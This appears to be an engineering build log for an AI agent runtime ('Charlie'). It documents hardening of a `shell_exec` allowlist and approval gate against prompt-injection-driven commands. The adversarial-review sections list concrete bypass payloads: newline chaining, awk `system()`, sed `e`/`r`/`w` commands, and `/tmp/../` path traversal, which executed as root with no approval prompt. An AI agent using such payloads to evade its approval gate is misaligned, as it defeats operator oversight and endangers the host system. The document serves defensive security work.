**Slice 3b.1 amendment (2026-05-14).** PR #19's test passed against the in-process `registerForRequest` API but missed two integration gaps that only surfaced once the gate fired on the live runtime: (1) the gate emitted no log event when no on-demand skills routed, so generic messages produced zero tool-call.log entries — indistinguishable from "code never ran"; (2) the test never drove `Agent._processNonReflex`, so a regression at that integration point would not have been caught. Slice 3b.1 (PR #20) adds an unconditional `'on_demand_routing'` summary record per `registerForRequest` call (carries `routed_always_on_skills`, `routed_on_demand_skills`, `declared_tools`, `activated_by_skill`, `active_set_size`) plus a `'deregistration'` record per cleanup, and rewrites the test to drive `agent.process()` end-to-end with a stub router/executor that records the tool list visible to the LLM. `scripts/verify-coupling.js` is the reproducible live verification harness — its log excerpt is now the standard for any slice that claims behavioural change to the tool surface.

**Slice 3c — `shell_exec` narrowing + hygiene.** ✓ COMPLETE 2026-05-15 — *verified-then-amended* (see Slice 3c.1)

`shell_exec` gate inverted from blocklist to allowlist. New
`src/tools/shell-exec-allowlist.js` exports `checkAllowlist(command)`;
`shell-exec.js` consults it ahead of the existing DENY / DESTRUCTIVE /
quantumclaw-dir gates. Allowlisted verbs (per Component 4 Narrowed):
`ls`, `cat`, `head`, `tail`, `wc`, `sort`, `uniq`, `grep`, `find`,
`awk`, `sed`, `git status`, `git log`, `git diff`, `pm2 list`,
`pm2 logs` (with `--nostream` required). Per-verb rules: `find -delete /
-exec / -execdir / -fprint / -fprintf / -ok` rejected; `sed -i /
--in-place` rejected; `pm2 logs` without `--nostream` rejected
(streaming hangs the agent). Chaining / substitution rejected at the
allowlist layer: `;`, `&&`, `||`, standalone `&`, `$(`, backticks.
Pipes (`|`) permitted with every segment allowlisted.

**Defence in depth preserved.** Allowlisted commands still flow through
the existing DENY (secret paths, pipe-to-shell), DESTRUCTIVE (rm -rf,
sudo, kill, redirects-to-root), and quantumclaw-dir gates — verified
`cat /root/.quantumclaw/.env` passes the allowlist (cat is allowed) but
is hard-blocked by DENY and never reaches approval. Non-allowlisted
commands return structured `{error:'not_allowlisted', reason, verb,
suggestion}` and never consult the approval system.

**Name reconciliation (audit Finding 9).** Canonical name is
`shell_exec`. `shell_execute` was a dormant alias (nothing registered
under it); the references in `src/security/approval-gate.js`
(SHELL_TOOLS list, gatedTools default, riskWeights key) and
`src/tools/executor.js` _categorizeToolCall were inert and have been
flipped to `shell_exec`. Gating still worked end-to-end because
`shell-exec.js` calls `approvalGate.requestInlineApproval()` with
`tool: 'shell_exec'` directly; the wrong-name defaults were never reached.

**Read/write split for future Slice 6 observation tools.** Slice 6 will
introduce per-specialist read-only observation tools (`read_file`,
`grep_repo`, `list_dir`, `git_status`, etc.) that replace today's
`shell_exec` invocations with structured, scope-limited surfaces.
Slice 3c documents the split: `shell_exec` is the catch-all read-only
surface (allowlist-narrowed); Slice 6 tools are typed, audited, and
scoped to specialist agents. `shell_exec` retains its scope='shared'
status as the floor surface until per-specialist tooling lands.

Verification harness: `scripts/verify-shell-allowlist.js` exercises
four cases (allowlisted forms, 8 non-allowlisted rejections,
3 DENY-layering proofs, 1 QC-dir approval-still-fires). New test
`tests/shell-exec-allowlist.test.js` (55 checks) wired into npm test;
all existing tests still green.

**Slice 3c.1 amendment (2026-05-15) — gate ordering.** PR #23's
Slice 3c shipped the allowlist as the inner first-line check inside
`shell-exec.js` and the test/harness pair exercised that function in
isolation. Both passed. The live runtime failed: the `ToolExecutor`
invokes `ApprovalGate.check()` *before* the tool function runs, and
`shell_exec` is in `gatedTools` — step 3 of the gate caught every
`shell_exec` call (including `pm2 list`) and gated for approval
before the inner allowlist could speak. Live smoke test 2026-05-15
17:00 Athens: "check pm2 status" produced a high-risk approval prompt
for `shell_exec({"command":"pm2 list"})`. Slice 3c.1 (PR #TBD,
2026-05-15) adds an early branch to `ApprovalGate.check()` that
consults `checkAllowlist()` for `toolName === 'shell_exec'` and
returns `requiresApproval:false` for any non-empty command — the
inner allowlist in `shell-exec.js` remains the single source of truth
for the `not_allowlisted` response shape, now functioning as a
redundant second-line defence. New harness
`scripts/verify-approval-gate-allowlist-ordering.js` exercises the
LIVE `ToolExecutor → ApprovalGate.check() → ToolRegistry.executeTool()
→ shell-exec.fn()` call path with real instances — 13 commands, 53
assertions, including a notifier-fired-zero-times sanity check. New
test `tests/approval-gate-allowlist-ordering.test.js` (36 checks)
codifies the contract. Lesson: a verification harness that exercises
the inner unit in isolation is not enough — for any slice that
modifies a layered defence, the harness must drive the layer above
the change. This is the second consecutive slice that shipped with
isolated unit tests passing while runtime was broken (3b.1 was the
first); Slice 4 (verification gates) becomes the next priority for
structural mitigation.

**Slice 3 family ✓ FULLY CLOSED 2026-05-15 (revised).** Slice 3a
(registry refactor + dead surface removal, PR #18, 2026-05-14)
✓ COMPLETE. Slice 3b (skill-loading ↔ tool-registration coupling,
PR #19, 2026-05-14) ✓ COMPLETE. Slice 3b.1 (per-message coupling
observability + end-to-end test, PR #20, 2026-05-14) ✓ COMPLETE.
Slice 3c (allowlist + name reconciliation, PR #23, 2026-05-15)
✓ COMPLETE — verified-then-amended. Slice 3c.1 (gate ordering fix +
live-path harness, PR #24, 2026-05-15) ✓ COMPLETE. Slice 4
(verification gates) begins next session.

**Slice 3c.1 post-review remediation (2026-05-15).** Before flipping
PR #24 ready-for-review the change went through an adversarial
review. The review found a CRITICAL security regression introduced
by Slice 3c.1 itself: with the gate-ordering fix in place,
`shell_exec({command: "pm2 list\necho pwned"})` was allowlisted by
`checkAllowlist()` (because `CHAIN_REJECT_PATTERNS` in
`shell-exec-allowlist.js` lines 53-60 caught `;`, `&&`, `||`, `&`,
`$(`, backtick — but NOT `\n` or `\r`), the early shell_exec branch
in `ApprovalGate.check()` returned `requiresApproval:false`, and
`execAsync(command, { shell: '/bin/bash', cwd: '/root/QClaw' })`
executed both lines as root with NO approval prompt. Pre-3c.1 the
`gatedTools: ['shell_exec']` step in `ApprovalGate.check()` would
have forced Telegram approval for the full command body. Slice 3c.1
removed that backstop. Remediation: two commits on the same branch
— (a) add `{ name: 'newline', re: /[\r\n]/ }` to
`CHAIN_REJECT_PATTERNS` plus 21-assertion regression test that
drives the live executor sequence with newline / CR / CRLF
injections, and (b) extend the verification harness with a C4
case-set (cat / ls redirect-outside-/tmp, sudo pm2 list) that
drives the allowlisted-verb-with-inner-DESTRUCTIVE shape through
the same `runOneCall` flow — closing a harness gap the docstring
at lines 5-7 had falsely claimed coverage on. Harness now 78/78
passing (was 53/53; 25 new assertions).

**Slice 3c.1 scope amendment — round-2 review (2026-05-15).** Round-1
remediation went back for a second adversarial pass and surfaced 2
CRITICAL + 2 HIGH allowlist-escape bypasses on top of the newline
fix:

- **CRITICAL #1 — awk shell-escape.**
  `shell_exec({command: 'awk BEGIN{system("echo PWNED")}'})` returns
  `{allowed:true}` from `checkAllowlist`, executes `echo PWNED` via
  awk's `system()` builtin under bash as root with no approval prompt.
  Variants: `-e BEGIN{system(...)}`, `'BEGIN{print | "cmd"}'`,
  `getline ... | "cmd"`, awk's `|&` coprocess operator.
- **CRITICAL #2 — sed `e` command shell-escape.**
  `sed -e "1e echo PWN" /tmp/x` — GNU sed's `e` command executes shell
  per pattern-matched line. Only `-i` / `--in-place` were in
  `DISALLOWED_FLAGS`.
- **HIGH #1 — sed internal file I/O.**
  `sed -e "1r /etc/shadow"` reads arbitrary files; `sed -e "w /file"`
  writes to arbitrary files. Same surface: `R` / `W`. Bypasses the
  shell-redirect DESTRUCTIVE regex via sed's internal commands.
- **HIGH #2 — `..` path-traversal through redirect-outside-/tmp.**
  `cat /tmp/x > /tmp/../etc/passwd` passes the DESTRUCTIVE regex
  `>\s*\/(?!dev/null|tmp/)` because it sees `> /tmp/` and exempts.
  Bash resolves `/tmp/../etc/passwd` → `/etc/passwd`. Same with
  `/tmp/./../etc/passwd`.

**Decision per Tyson: drop awk + sed from `ALLOWED_VERBS` rather than
chase enumerated flag/body bans.** Rationale: both verbs expose
shell-spawn surfaces that can't be safely enumerated. awk runs shell
from inside its quoted program body (`BEGIN{system(...)}`, `|`-from-
program, `|&`). GNU sed has the `e` command (shell) plus `r`/`w`/`R`/
`W` (file I/O). Any future awk/sed feature could open a new bypass.
The agent rarely needs awk/sed for read-only work — `grep -E`,
`head`, `tail`, and `cat` cover the common cases. For complex
transforms, `claude_code_dispatch` (Slice 5) is the right path.

**Scope amendment (this PR):** Slice 3c.1 expanded from "gate
ordering fix" to **"gate ordering + allowlist hardening"**:

- Remove `awk`, `sed` from `SINGLE_VERBS` in
  `src/tools/shell-exec-allowlist.js`. Remove now-dead
  `DISALLOWED_FLAGS.sed` entry.
- Add `{ name: 'parent-dir traversal', re: /\.\./ }` to
  `CHAIN_REJECT_PATTERNS` — blanket rejection of `..` anywhere in
  the command body. Conservative-but-clean: rejects all `..` paths
  even for non-redirect uses, but allowlisted read-only verbs
  rarely need relative paths and can use absolute forms.
- Regression tests for all four round-2 findings driven through the
  live executor sequence (real `ApprovalGate` + real `ToolRegistry`
  + real `shell_exec`) in `tests/approval-gate-allowlist-ordering.test.js`.
- New C5 case-set in `scripts/verify-approval-gate-allowlist-ordering.js`
  covering the same eight cases; harness now 135/135 passing
  (was 78/78; 57 new assertions).
- Resolves the previously-LOW `awk -i inplace` followup in
  `FLOW_OS_STATE.md` (now closed by dropping the verb).

See **Slice 3d (planned)** for the structural redesign that
replaces enumeration with an explicit argv-parser approach.

**Adversarial review becomes standard.** This was the third
consecutive slice in eight days (3b.1, 3c → 3c.1, 3c.1 itself) to
ship into review with isolated tests passing while a runtime or
threat-model contract was broken. Common pattern: harnesses
exercise happy-path shapes from the original author's mental
model, not adversarial shapes from an attacker's. Adversarial
review pre-PR is now the explicit mitigation for the Slice 3
family closure, and **the protocol should become standard for all
future slices touching security boundaries** — minimum: every
slice that modifies `ApprovalGate`, `shell-exec*`, `executor`,
secrets handling, or tool registration / scope enforcement. Slice
4's `runGates()` will codify this in the runtime, but until then
it is a per-PR procedural step.

**Slice 4 — Verification gates (soft + hard).**
`verification-reflexes.md` skill written and loaded. `runGates()` runtime function with five gates. Gate log in place.

**Slice 3d — Allowlist redesign.** PLANNED.
Two-round adversarial review on Slice 3c.1 surfaced 4 CRITICALs in
the allowlist-by-enumeration design (chaining via newline, awk
shell-escape, sed shell-escape, sed file I/O). Drop-the-verb
approach worked for 3c.1 but is unsustainable as the read-only
surface expands. Slice 3d evaluates two paths:

- **(a)** Narrow the allowlist to a verb set safely auditable by
  enumeration (e.g. 5-8 verbs total with no shell-spawn surface —
  `ls`, `cat`, `head`, `tail`, `wc`, `pm2 list`, `git status` are
  candidates; `grep`/`find` need flag re-audit; everything else
  goes through `claude_code_dispatch`).
- **(b)** Replace the allowlist with an explicit safe-command
  parser that constructs argv lists rather than parsing shell
  strings — no `bash -c`, no quoting issues, no chaining surface.

Triggered after Slice 4 (verification gates) lands. Threat model:
prompt-injection-driven `shell_exec` call construction. Status:
PLANNED. Reference: this PR's round-2 adversarial review.

**Slice 5 — Claude Code delegation bridge.**
Supabase table, `claude_code_dispatch` tool, PM2 dispatcher worker, result write-back, gate integration.

**Slice 6 — Specialist scaffolding.**
Specialist registry materialised as actual sub-agent shells with their scoped tools. Initially most are stubs that route back to Charlie; live ones (Content Studio Operator existing pipeline, Community Manager existing skill) get migrated to the new pattern.

Each slice ends with: documentation update in `CHARLIE_OVERHAUL.md`, build log entry, brief Tyson review, then next slice begins.

## Phase 5+ roadmap

After Charlie 2.0 stable:
- Specialist hardening (each specialist independently reliable to Charlie 2.0 standard)
- State model and dispatch layer (structured state object, queryable handoff records)
- Daily rhythm scaffolding (morning/evening digest generation, overnight dispatch)
- *Priority promotion:* autonomous Claude Code follow-up chaining (target: 4 weeks of clean dispatch operation)
- Intent classification skill router (replace keyword routing)
- Streaming-level verification gates (if response-level proves insufficient)
- Gate log surface in QClaw dashboard
- Trust calibration ongoing — task types move up/down trust gradient based on observed reliability
